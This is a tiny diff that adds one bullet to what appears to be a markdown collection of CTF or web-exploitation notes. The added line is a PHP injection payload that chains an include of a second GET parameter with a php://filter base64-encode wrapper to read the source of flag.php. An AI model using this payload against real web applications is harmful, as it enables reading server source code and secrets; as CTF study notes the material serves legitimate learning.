@@ -29,6 +29,9 @@
 
 <br>
 
+* c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+
+<br>
 
 
 ````
